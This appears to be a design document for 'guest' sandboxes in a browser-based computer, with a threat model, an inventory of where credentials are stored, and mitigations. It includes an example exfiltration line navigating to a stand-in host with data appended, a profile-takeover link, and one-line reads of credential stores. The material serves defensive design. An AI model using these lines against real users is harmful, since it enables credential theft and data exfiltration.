# Guest: a clean place for untrusted work (tabcomputer#113)

Two pitches rest on it: "run a coding agent where it can't hurt anything" and
"open a repo or archive you don't trust". Today neither is true in a tab that
has been used: `~/.claude`, `~/.gitconfig` and the GitHub token are readable by
every process, and a planted git hook runs.

"Profile" already means a product profile here (docs/PROFILES.md), so the code
and the UI say **guest**.

## Threat model

The attacker is code the user runs or opens: a repository, an archive, an npm
package's install script, an agent following instructions it read in a file.
It wants the user's credentials (the Claude sign-in in `~/.claude`, the GitHub
token, git identity, API keys), the user's other files, and a foothold that
survives.

Where that code runs decides what a boundary must be:

- x86-64 and WASM programs are kernel processes. They see the filesystem and
  the network only through syscalls, so the kernel could confine them.
- `node`, npm install scripts, `hotswap`, `js-eval` and everything on
  node-compat are **JavaScript in the page's origin**: in the page itself, or
  in a Worker of it (`src/node-worker/`). They can call `indexedDB.open`,
  `localStorage`, `navigator.storage.getDirectory()`, `caches`,
  `navigator.serviceWorker`, `fetch` and `WebSocket` directly. No kernel check
  is in that path.

So the only boundary that holds against the second group is the browser's:
**the origin**. Everything the main profile's secrets live in is origin-scoped:

| secret | where (code) |
|---|---|
| files, `~/.claude/.credentials.json`, `~/.gitconfig` | IndexedDB `tabcomputer-fs` (`src/filesystem.ts`) |
| GitHub token | `localStorage.tabcomputer_github_token` (`src/github-auth.ts`, `src/net-signin.ts`) |
| API keys | `localStorage.tabcomputer_{anthropic,openai,google,api}_key` |
| remote-control code | `localStorage.tabcomputer-remote-code` |
| Browser app cookie jar and password vault | IndexedDB (`src/browser/kv.ts`) |

The server holds no user secret and sets no cookie (`server.mjs` has no
`set-cookie`; its proxies forward the caller's own headers).

## Options

### a. A separate origin per guest (recommended)

`https://guest--<name>.tabcomputer.com`, the app served as it is today.

What the browser then isolates, with no code of ours in the path: IndexedDB,
localStorage, sessionStorage, OPFS, Cache API, service workers, BroadcastChannel,
SharedWorker, Web Locks, and storage permissions and persistence. A node script
in a guest that enumerates `indexedDB.databases()` sees the guest's.

What is still shared, and what a guest could do with it:

- **The server's routes** (checked one by one in `server.mjs`):
  - `/api/{anthropic,platform,mcp-proxy,gemini,github}`: forwarding proxies that
    add no credential. A guest gets what any internet client gets.
  - `/api/github-login/` (device flow with tabcomputer's OAuth client): a guest
    can start a flow and show the user a code. Approving it gives the *guest* a
    token. Refused for guests. This only closes our proxy: a guest with network
    can reach github.com through the relay, and the client id is public. The
    statement on screen has to carry the rest ("anything you sign in to here…").
  - `/tcp`, `/tcp/token`: `TABCOMPUTER_TCP_ORIGINS` already lists
    `https://*.tabcomputer.com`, so a guest gets the relay, from the user's IP
    and against the user's per-IP budgets. No sign-in is needed today
    (`TABCOMPUTER_TCP_REQUIRE_SIGNIN=0`). If sign-in is ever required, a guest
    has no token: see "Owner decisions".
  - `/git-proxy/`: an open proxy to public hosts on 80/443, for anyone.
  - `/offer`, `/answer/`, `/relay/`, `/channel/`: mailboxes keyed by random
    codes. The main profile's code is in its own localStorage, not guessable.
  - `/api/seed` (upload, 512 KB, rate-limited per IP): an exfiltration channel
    like any other request.
  - `/api/ws-proxy`: only `api.anthropic.com`, caller's headers.
  - `/oauth/callback`: posts to a same-origin BroadcastChannel, so a guest's
    callback page reaches the guest only. (Any site can open the *main* origin's
    callback page with made-up parameters; that exists today.)
- **Browse origins** (`{key}.web.tabcomputer.com`, docs/BROWSER.md): their
  `frame-ancestors` is `https://*.tabcomputer.com`, and a site's own
  localStorage lives in its browse origin. A guest on a tabcomputer.com
  subdomain could frame `mail-example-com.web.tabcomputer.com`, act as its
  broker and run its own script there. The slice makes browse documents refuse
  a guest parent (`parentAppOrigin`) and turns the Browser app off in guests.
  CSP cannot exclude a subdomain pattern, so this rests on our script.
- **Same site.** A guest on `*.tabcomputer.com` is same-*site* with the main
  profile. Consequences:
  - Storage partitioning does not apply between them: a guest that frames
    `https://tabcomputer.com/` gets the main profile's real storage in that
    frame, and `main.ts` takes a `shiro-seed` message from any parent and
    imports it. The slice refuses to boot the main profile in a guest's frame
    (client, `location.ancestorOrigins`; server, `Sec-Fetch-Site: same-site`
    with a frame destination).
  - Cookies with `Domain=tabcomputer.com` would be shared. There are none
    today; there must never be one.
  - Chrome gives a cross-origin isolated page (COOP + COEP, which the app shell
    already sends) an origin-keyed process, so Spectre-style reads across the
    two are not expected there. Other browsers are weaker on this.
- **Links into the main profile.** A guest can navigate its own tab anywhere,
  with no click. `main.ts` acts on URLs: `/s/<id>` imports a shared seed
  (files and localStorage) and `/<user>/<repo>` clones a repository and runs it
  (`src/github-player`). Both run in whatever origin the link names, so
  `location.href = 'https://tabcomputer.com/s/<seed with a ~/.profile>'` would
  take over the main profile, from any web page, guests or not. What stops it
  today is a bug: the build's chunks load from `./assets/` (vite `base: './'`),
  so the app does not start at a two-segment path (`/s/assets/…` is a 404, on
  tabcomputer.com too). Fixing that bug opens the hole.
  The rule the design needs: **no URL makes the main profile import or run
  code without a click in the main profile.** With guests on, such links open
  in a guest.

DNS and TLS today (deploy/tabcomputer/README.md, `tls-install.sh`): the A
record for `*.tabcomputer.com` points at the droplet, and a wildcard
certificate for `*.tabcomputer.com` and `*.web.tabcomputer.com` is installed
with an nginx block that forwards every such host to `server.mjs`. A one-label
guest host therefore works with no DNS or certificate change. A two-label one
(`x.guest.tabcomputer.com`) would need a new certificate.

Cross-origin isolation: the app shell and scripts get COOP `same-origin` and
COEP `credentialless` by path, not by host, so a guest is cross-origin
isolated like the main page (Workers, SharedArrayBuffer, Blink all work).

Quota and persistence: a new origin starts with best-effort storage and no
persistence grant. Chrome's quota is per origin; Firefox also caps the whole
eTLD+1 group, so guests share the main profile's group limit there. A big
Debian install is downloaded again per guest (chunks are immutable and come
from the HTTP cache when the browser keeps one across origins, which
partitioned caches mostly don't).

### b. A namespace inside the origin

Another IndexedDB name, a filesystem prefix, or a kernel mount namespace. It
stops x86 and WASM programs, and honest tools. It does not stop a node script:
`indexedDB.open('tabcomputer-fs')` and `localStorage.tabcomputer_github_token`
are one line each, in page mode and in Worker mode. Since npm install scripts
and agents' tools are node, this would be a boundary that fails exactly for
the cases the pitches name. Not offered, not even as a "light" mode: the
statement on screen could not be true.

### c. Others

- **Opaque origin** (`sandbox` without `allow-same-origin`, as an iframe or a
  CSP header): no storage of any kind, so no named guest, no Debian install
  that survives a reload, and the filesystem would need a memory backend. A
  top-level document with sandbox flags cannot have COOP `same-origin` (HTML
  makes that a network error), so no cross-origin isolation, no
  SharedArrayBuffer, no Worker node, no Blink. Loses.
- **A separate registrable domain for guests** (as githubusercontent.com is
  to github.com): option a, minus everything under "Same site". Frames of the
  main profile are storage-partitioned, `*.tabcomputer.com` patterns (browse
  `frame-ancestors`, relay origins) stop matching by themselves, cookies can't
  be shared. This is the end state; see "Owner decisions".
- **Storage partitioning / Storage Buckets**: partitioning keys on the
  top-level site, which is ours in every case; buckets are still same-origin.
  Neither separates anything from same-origin script.

## Design

**Name.** One DNS label: `guest--<name>` plus optional flags,
`guest--<name>--<flags>`. `name` is `[a-z0-9]{1,32}`; flags are `t` (thrown
away) and `x` (no network), in that order. The double dashes make it a label
`decodeOriginKey` rejects, so it never collides with a browse key on
localhost, and unlikely to be an instance name.

The flags are in the hostname on purpose: the server enforces from the `Host`
(and `Origin`) header, and guest script cannot change its own origin. A mode
kept in a query parameter or in storage would be the guest's to edit.

**Opening one.**
- Menu: System → New Guest Window, New Guest Window (No Network).
- Command: `guest open [--no-network] [--keep NAME]`, `guest url …`.
- URL on the main origin: `?guest` (thrown away), `?guest=NAME` (kept),
  `&nonet`. Handled first in `main()`, before the filesystem opens; the other
  parameters and the path go along.
- **Run links** (docs/RUN_LINKS.md): a link asks for a guest by carrying
  `guest` (and `nonet`): `?run=untrusted-repo&url=…&guest`. `main()` goes to
  the guest before boot, so nothing of the link is fetched or shown in the
  main profile; the Run / Cancel window then appears in the guest. When the
  link asked for a guest and the server has none, `guestUnavailable()` is
  true and `main.ts` does not start the run. Not done, and recommended once
  the site has guests: `gh:` and `sh:` links go to a guest by themselves, and
  the gallery's `claude-sandbox` and `untrusted-repo` links carry `&guest`.
- `/s/<id>` and `/<user>/<repo>` on the main origin open in a guest when the
  server has guests (a seed in a kept guest named after it, a repository in a
  thrown-away one). `bootGuest` does this; it cannot be seen working until
  the app starts at those paths again (above).

**No network** can truthfully mean this, and no more:
- Linux and WASM programs have no route out: the page gives the kernel no
  relay, and the server refuses `/tcp` for that host.
- The server refuses its proxies (`/api/`, `/git-proxy/`, `/offer`, `/relay/`,
  `/channel/`, …) to that host, and to that `Origin` on any host. Static
  files, `/debian/` and `/claude-releases/` (GET, fixed upstreams) still answer.
- A CSP on every response to that host (`connect-src 'self'`,
  `default-src 'self' blob: data:`, `form-action 'self'`, `webrtc 'block'`)
  makes the browser refuse `fetch`, XHR, WebSocket, images, scripts and frames
  to other origins. The kernel cannot do this; only the server's header can.
- It does **not** stop the page navigating itself (`location.href =
  'https://elsewhere/?' + data`) or opening a window: CSP has no directive for
  that. So script in a no-network guest can still send out what is in the
  guest. The guest holds no credentials, so that is the files the user put
  there. The statement says so.

**Thrown away or kept.** A kept guest is the origin's storage under its name,
until discarded. A thrown-away one:
- Discard (menu bar, `guest discard`) deletes every IndexedDB database, cache,
  OPFS entry, service worker and storage key of the origin, from a fresh
  document so nothing holds them open.
- Closing the tab cannot be relied on to run anything. What is left is deleted
  the next time that address opens in a new tab (a session id in
  sessionStorage tells a reload from a new tab; a Web Lock tells whether
  another tab still runs it).
- Later: a memory-backed filesystem, so a thrown-away guest writes nothing to
  disk at all.

`Clear-Site-Data` is deliberately not used: its `"cookies"` type clears the
whole registrable domain, and a header on a GET could be triggered by a link.

**Files in and out** are deliberate acts through the user's own disk:
`upload`, `download`, drag and drop, the Files app; `git clone` and `git push`
with network. Nothing moves between a guest and the main profile directly.

**Sign-ins.** A guest starts with none. The network sign-in sheet is not
raised in a guest, `gh auth login` and Accounts say what signing in there
means, and the server's device-flow proxy refuses guests. An agent needs its
own API credential inside the guest, and everything running there can read
it: use a key with a spending limit. A broker that lets the main profile
answer the guest's API calls without handing over the key is a later step.

**The statement** (menu bar "Guest" button, the terminal at boot, `guest`):
generated from the hostname and from whether the server confirmed it enforces
the mode (`/guest/config.json`), so it says less when less is true:

> This window is a separate site in your browser (HOST). What runs here cannot
> read your main tabcomputer: its files, ~/.claude, git settings or GitHub
> sign-in.
> It starts with no sign-ins. Anything you sign in to, paste or upload here
> can be read by everything that runs here.
> No network: … / It has internet access …
> Thrown away: … / Kept under the name …

## Still open after the slice

- Navigation out of a no-network guest (above).
- `frame-ancestors` of browse origins still admits guest subdomains; only our
  script refuses them. Firefox has no `ancestorOrigins`.
- `webrtc 'block'` and DNS prefetch under the CSP are not verified.
- Device-code phishing by a guest with network.
- The Claude credential an agent needs lives in the guest.
- `/oauth/callback` on the main origin takes parameters from any opener.
- Without guests enabled on the server, `/s/<id>` and `/<user>/<repo>` would
  import and run in the main profile once the app starts at those paths.
- Relay use by a guest counts against the user's IP.

## Owner decisions

1. **Guest domain.** Subdomains of tabcomputer.com work with today's DNS and
   certificate and cost nothing, but leave the "Same site" list resting on our
   own checks. A separate registrable domain costs a domain, a wildcard
   certificate, an nginx block and `TABCOMPUTER_GUEST_ORIGIN`, and removes
   that list. Recommendation: ship on subdomains now, move to a separate
   domain before the pitch is made in public. The slice takes either
   (`TABCOMPUTER_GUEST_ORIGIN`).
2. **Relay policy for guests.** Open as today, or a smaller per-guest budget,
   or none without a pass minted by the main profile. Recommendation: as today
   while the relay needs no sign-in; when sign-in is required, a short-lived
   relay pass from the main profile rather than a token in the guest.
3. **Inbound code links.** Whether `/s/<id>`, `/<user>/<repo>` and run links
   open in a guest by default. Recommendation: yes. It changes what a shared
   seed link does (a guest, not your machine).

## Later steps

A log of files changed in a guest (the kernel sees every write: a journal per
guest, shown in Files); snapshot and rewind (copy-on-write over the IndexedDB
store, or export/import of the guest's database); the memory filesystem; the
credential broker; a "send to guest" that hands a directory over without the
user's disk.
